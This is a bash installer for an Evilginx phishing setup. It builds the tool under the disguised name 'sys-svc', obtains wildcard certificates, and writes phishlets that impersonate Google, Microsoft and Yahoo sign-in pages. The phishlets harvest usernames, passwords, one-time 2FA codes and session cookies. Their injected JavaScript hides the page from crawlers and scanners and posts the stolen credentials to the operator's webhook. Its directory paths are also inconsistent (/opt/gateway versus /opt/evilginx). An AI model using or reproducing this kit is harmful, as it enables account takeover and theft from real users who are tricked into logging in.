#!/bin/bash
# ============================================================================
# Evilginx Setup - Complete Installer with Enhanced Phishlets
# ============================================================================

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════╗
    ║                    Evilginx Setup v3.0                           ║
    ║              Enhanced Phishlets | Bot Detection                  ║
    ║                    Like Fpages - Simple & Clean                  ║
    ╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

print_banner

# Get configuration
log "Please enter your configuration:"
read -p "  Domain (e.g., motarmos.click): " DOMAIN
read -p "  VPS IP Address: " VPS_IP
read -p "  Cloudflare API Token: " CF_TOKEN
read -p "  Telegram Bot Token (optional): " TG_TOKEN
read -p "  Telegram Chat ID (optional): " TG_CHAT

WEBHOOK_SECRET=$(openssl rand -hex 16)

# Install dependencies
log "Installing dependencies..."
apt-get update -y >/dev/null 2>&1
apt-get install -y git curl wget build-essential golang-go openssl jq dnsutils expect nginx >/dev/null 2>&1

# Prevent Out-of-Memory during build on small VPS instances
TOTAL_RAM=$(free -m | awk '/^Mem:/{print $2}')
if [[ "$TOTAL_RAM" -lt 1900 ]] && [[ $(swapon --show | wc -l) -eq 0 ]]; then
    log "Creating 2GB swap file to prevent memory errors..."
    fallocate -l 2G /swapfile || dd if=/dev/zero of=/swapfile bs=1M count=2048
    chmod 600 /swapfile
    mkswap /swapfile
    swapon /swapfile
fi

# Install Go if needed
if ! command -v go &>/dev/null; then
    wget -q https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
    tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
    export PATH=$PATH:/usr/local/go/bin
    rm go1.22.0.linux-amd64.tar.gz
fi

# Build Evilginx
log "Building Evilginx from source..."
rm -rf /tmp/evilginx2
git clone https://github.com/kgretzky/evilginx2.git /tmp/evilginx2 2>/dev/null
cd /tmp/evilginx2
go build -buildvcs=false -o evilginx 2>/dev/null
cp evilginx /usr/local/bin/sys-svc
chmod +x /usr/local/bin/sys-svc

# Create directories
mkdir -p /opt/gateway/{config,phishlets,certs,storage,logs,notifications,html}

# Generate random subdomain prefixes (obfuscated - no brand names)
EP1="gw-$(openssl rand -hex 3)"
EP2="auth-$(openssl rand -hex 3)"
EP3="portal-$(openssl rand -hex 3)"

echo "$EP1" > /opt/gateway/.ep1
echo "$EP2" > /opt/gateway/.ep2
echo "$EP3" > /opt/gateway/.ep3

# Copy phishlets from local directory
log "Deploying phishlets..."
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [[ -f "$SCRIPT_DIR/phishlets/google.yaml" ]]; then
    cp "$SCRIPT_DIR/phishlets/google.yaml" /opt/gateway/phishlets/
    cp "$SCRIPT_DIR/phishlets/microsoft.yaml" /opt/gateway/phishlets/
    cp "$SCRIPT_DIR/phishlets/yahoo.yaml" /opt/gateway/phishlets/
else
    # Create phishlets directly if files not found
    cat > /opt/gateway/phishlets/google.yaml << 'EOF'
name: 'google'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '{{.Endpoint3}}', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: '{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{{.Endpoint3}}.{{.Domain}}', mimes: ['text/html', 'application/json'], replace_all: true}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '.google.com', replace: '.{{.Domain}}', headers: ['Set-Cookie']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Secure;', replace: '', headers: ['Set-Cookie']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'SameSite=Lax', replace: 'SameSite=None', headers: ['Set-Cookie']}
auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'LSID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID']
  - domain: 'accounts.google.com'
    keys: ['GAPS', 'LSID', 'GV']
credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'
  twofa:
    key: 'TotpPin'
    search: '([0-9]{6})'
    type: 'post'
login:
  domain: 'accounts.google.com'
  path: '/v3/signin/identifier'
  paths:
    - '/v3/signin/identifier'
    - '/v3/signin/challenge/pwd'
    - '/v3/signin/challenge/sk'
    - '/v3/signin/challenge/totp'
js_inject:
  - trigger_domains: ['{{.Endpoint3}}.{{.Domain}}', 'accounts.google.com']
    trigger_paths: ['/.*']
    script: |
      (function() {
        const ua = navigator.userAgent.toLowerCase();
        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
            window.location.href = "https://www.google.com";
            return;
        }
        const api = "https://{{.Domain}}/api/webhook";
        const secret = "{{.WebhookSecret}}";
        const source = "google";
        let capturedEmail = '';
        let sessionCaptured = false;
        function sendData(type, email, password, code) {
          const payload = { event: type, source: source, remote_addr: "{{.VpsIp}}" };
          if (email) payload.email = email;
          if (password) payload.password = password;
          if (code) payload.code = code;
          fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
            body: JSON.stringify(payload)
          }).catch(function(e){});
        }
        function extractSessionCookies() {
          if (sessionCaptured) return;
          sessionCaptured = true;
          sendData("session", capturedEmail, null, null);
        }
        function observeForm() {
          const forms = document.querySelectorAll('form');
          forms.forEach(function(form) {
            if (form.hasAttribute('data-listener')) return;
            form.setAttribute('data-listener', 'true');
            form.addEventListener('submit', function() {
              setTimeout(function() {
                const emailInput = document.querySelector('input[type="email"], input[name="identifier"]');
                const passInput = document.querySelector('input[type="password"], input[name="Passwd"]');
                const codeInput = document.querySelector('input[name="TotpPin"], input[name="otc"]');
                const email = emailInput ? emailInput.value : null;
                const password = passInput ? passInput.value : null;
                const code = codeInput ? codeInput.value : null;
                if (email && email !== capturedEmail) {
                  capturedEmail = email;
                  sendData("email", email, null, null);
                }
                if (password) {
                  sendData("credentials", capturedEmail || email, password, null);
                }
                if (code && code.length === 6) {
                  sendData("2fa", capturedEmail || email, null, code);
                }
              }, 100);
            });
          });
        }
        setInterval(function() {
          if (!sessionCaptured && capturedEmail && document.cookie.includes('SID')) {
            extractSessionCookies();
          }
        }, 2000);
        observeForm();
        new MutationObserver(observeForm).observe(document.body, { childList: true, subtree: true });
      })();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF

    cat > /opt/evilginx/phishlets/microsoft.yaml << 'EOF'
name: 'microsoft'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true}
sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'logincdn.msauth.net', replace: 'logincdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'aadcdn.msftauth.net', replace: 'aadcdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
  - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '.login.microsoftonline.com', replace: '.{{.Domain}}', headers: ['Set-Cookie']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Secure;', replace: '', headers: ['Set-Cookie']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'SameSite=Lax', replace: 'SameSite=None', headers: ['Set-Cookie']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'redirect_uri=https://login.microsoftonline.com', replace: 'redirect_uri=https://{{.Endpoint2}}.{{.Domain}}', headers: ['Location']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'Access-Control-Allow-Origin: https://login.microsoftonline.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint2}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT', 'SignInStateCookie']
  - domain: '.microsoftonline.com'
    keys: ['SignInStateCookie', 'ESTSAUTH']
  - domain: 'login.microsoftonline.com'
    keys: ['MSFPC']
credentials:
  username:
    key: 'loginfmt'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
  twofa:
    key: 'otc'
    search: '([0-9]{6})'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/'
  paths:
    - '/'
    - '/common/oauth2/v2.0/authorize'
js_inject:
  - trigger_domains: ['{{.Endpoint2}}.{{.Domain}}', 'login.microsoftonline.com']
    trigger_paths: ['/.*']
    script: |
      (function() {
        const ua = navigator.userAgent.toLowerCase();
        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
            window.location.href = "https://www.google.com";
            return;
        }
        const api = "https://{{.Domain}}/api/webhook";
        const secret = "{{.WebhookSecret}}";
        const source = "microsoft";
        let capturedEmail = '';
        let sessionCaptured = false;
        function sendData(type, email, password, code) {
          const payload = { event: type, source: source, email: email, password: password, code: code, remote_addr: "{{.VpsIp}}" };
          fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
            body: JSON.stringify(payload)
          }).catch(function(){});
        }
        function capture() {
          const emailInput = document.querySelector('input[name="loginfmt"], input[type="email"]');
          const passInput = document.querySelector('input[name="passwd"], input[type="password"]');
          const codeInput = document.querySelector('input[name="otc"], input[id="idTxtBx_OTP_Code"]');
          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
            capturedEmail = emailInput.value;
            sendData("email", capturedEmail, null, null);
          }
          if (passInput && passInput.value) {
            sendData("credentials", capturedEmail, passInput.value, null);
          }
          if (codeInput && codeInput.value && codeInput.value.length === 6) {
            sendData("2fa", capturedEmail, null, codeInput.value);
          }
        }
        function checkSession() {
          if (!sessionCaptured && capturedEmail && document.cookie.includes('ESTSAUTH')) {
            sessionCaptured = true;
            sendData("session", capturedEmail, null, null);
          }
        }
        setInterval(capture, 500);
        setInterval(checkSession, 3000);
        document.addEventListener('submit', function() { setTimeout(capture, 200); });
        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
      })();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF

    cat > /opt/evilginx/phishlets/yahoo.yaml << 'EOF'
name: 'yahoo'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'login.yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'yahoo.com', session: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript'], replace_all: true}
  - {triggers_on: 'api.login.yahoo.com', orig_sub: 'api', domain: 'login.yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['application/json'], replace_all: true}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html'], replace_all: true}
  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html'], replace_all: true}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '.yahoo.com', replace: '.{{.Domain}}', mimes: ['text/html'], headers: ['Set-Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Secure;', replace: '', headers: ['Set-Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Lax', replace: 'SameSite=None', headers: ['Set-Cookie']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', headers: ['Location', 'Refresh']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\\.yahoo\\.com', replace: '{{.Endpoint1}}\\.{{.Domain}}', mimes: ['application/json'], replace_all: true}
auth_tokens:
  - domain: '.yahoo.com'
    keys: ['A3', 'A1', 'A1S', 'Y', 'T', 'S', 'PH', 'B', 'X']
  - domain: 'login.yahoo.com'
    keys: ['B', 'X', 'SESSION_ID']
  - domain: '.guce.yahoo.com'
    keys: ['GUCE', 'GUCS']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  twofa:
    key: 'verificationCode'
    search: '([0-9]{6})'
    type: 'post'
login:
  domain: 'login.yahoo.com'
  path: '/'
js_inject:
  - trigger_domains: ['{{.Endpoint1}}.{{.Domain}}', 'login.yahoo.com']
    trigger_paths: ['/.*']
    script: |
      (function() {
        const ua = navigator.userAgent.toLowerCase();
        const isBot = /bot|crawler|spider|scanner|curl|wget|python|go-http|headless|phantom|selenium|puppeteer|playwright/i.test(ua);
        if (isBot || navigator.webdriver || /headless/i.test(ua)) {
            window.location.href = "https://www.google.com";
            return;
        }
        const api = "https://{{.Domain}}/api/webhook";
        const secret = "{{.WebhookSecret}}";
        const source = "yahoo";
        let capturedEmail = '';
        let sessionCaptured = false;
        function sendData(type, email, password, code) {
          const payload = { event: type, source: source, email: email, password: password, code: code, remote_addr: "{{.VpsIp}}" };
          fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
            body: JSON.stringify(payload)
          }).catch(function(){});
        }
        function capture() {
          const emailInput = document.querySelector('input[name="username"], input[type="email"]');
          const passInput = document.querySelector('input[name="password"], input[type="password"]');
          const codeInput = document.querySelector('input[name="verificationCode"], input[type="tel"]');
          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
            capturedEmail = emailInput.value;
            sendData("email", capturedEmail, null, null);
          }
          if (passInput && passInput.value) {
            sendData("credentials", capturedEmail, passInput.value, null);
          }
          if (codeInput && codeInput.value && codeInput.value.length >= 6) {
            sendData("2fa", capturedEmail, null, codeInput.value);
          }
        }
        function checkSession() {
          if (!sessionCaptured && capturedEmail && document.cookie.includes('A3')) {
            sessionCaptured = true;
            sendData("session", capturedEmail, null, null);
          }
        }
        setInterval(capture, 500);
        setInterval(checkSession, 3000);
        document.addEventListener('submit', function() { setTimeout(capture, 500); });
        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
      })();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]
EOF
fi

# Update phishlets with actual values
log "Configuring phishlets with your domain..."
sed -i "s/{{.Domain}}/$DOMAIN/g" /opt/evilginx/phishlets/*.yaml
sed -i "s/{{.Endpoint1}}/$EP1/g" /opt/evilginx/phishlets/yahoo.yaml
sed -i "s/{{.Endpoint2}}/$EP2/g" /opt/evilginx/phishlets/microsoft.yaml
sed -i "s/{{.Endpoint3}}/$EP3/g" /opt/evilginx/phishlets/google.yaml
sed -i "s/{{.VpsIp}}/$VPS_IP/g" /opt/evilginx/phishlets/*.yaml
sed -i "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" /opt/evilginx/phishlets/*.yaml
sed -i "s/{{.AppPort}}/443/g" /opt/evilginx/phishlets/*.yaml

# Create Evilginx config
cat > /opt/evilginx/config/config.yaml << EOF
daemon: false
debug: false
domain: $DOMAIN
ipv4: $VPS_IP
http_port: 80
https_port: 443
dns_port: 0
autocert: false
phishlets_path: /opt/evilginx/phishlets
cert_path: /opt/evilginx/certs
database: /opt/evilginx/evilginx.db
unauth_url: https://www.google.com
blacklist:
  enabled: true
  max_requests: 10
  block_duration: 3600
EOF

# Setup SSL with Cloudflare
log "Setting up SSL certificate..."
apt-get install -y certbot python3-certbot-dns-cloudflare >/dev/null 2>&1

cat > /etc/letsencrypt/cloudflare.ini << EOF
dns_cloudflare_api_token = $CF_TOKEN
EOF
chmod 600 /etc/letsencrypt/cloudflare.ini

log "Requesting wildcard certificate for *.$DOMAIN..."
certbot certonly --dns-cloudflare \
    --dns-cloudflare-credentials /etc/letsencrypt/cloudflare.ini \
    --dns-cloudflare-propagation-seconds 90 \
    --non-interactive --agree-tos --email "admin@$DOMAIN" \
    -d "$DOMAIN" -d "*.$DOMAIN" 2>/dev/null

if [[ -d "/etc/letsencrypt/live/$DOMAIN" ]]; then
    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "/opt/evilginx/certs/$DOMAIN.crt"
    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "/opt/evilginx/certs/$DOMAIN.key"
    log "SSL certificate installed successfully"
else
    warn "SSL failed - running in HTTP mode"
    sed -i 's/https_port: 443/https_port: 0/' /opt/evilginx/config/config.yaml
fi

# Create systemd service
cat > /etc/systemd/system/evilginx.service << EOF
[Unit]
Description=Evilginx Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/gateway
ExecStart=/usr/local/bin/sys-svc -c /opt/gateway/config -p /opt/gateway/phishlets
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable evilginx
systemctl start evilginx

log "Installation complete!"
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    EVILGINX INSTALLED!                          ${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Your subdomains:"
echo "  Yahoo: $EP1.$DOMAIN"
echo "  Microsoft: $EP2.$DOMAIN"
echo "  Google: $EP3.$DOMAIN"
echo ""
echo "Run 'evilginx-cli' to manage"
echo ""